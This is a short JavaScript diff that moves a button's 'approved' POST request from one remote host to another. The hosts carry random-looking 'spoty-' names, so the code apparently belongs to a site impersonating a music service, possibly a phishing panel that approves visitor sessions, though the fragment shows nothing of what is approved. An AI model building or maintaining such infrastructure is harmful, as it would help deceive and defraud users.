@@ -9,7 +9,7 @@ document.getElementById("ValidateButton").addEventListener("click", function (ev
 
     const data = { unique_id: uniqueId, action: "approved" };
 
-    fetch("https://spoty-d2k0fla2d-la2dasfsd.d2sckfda9r5aua.amplifyapp.com/approve.php", {
+    fetch("https://spoty-dfla0k2kfs-sdjla2dasf.onrender.com/approve.php", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify(data),
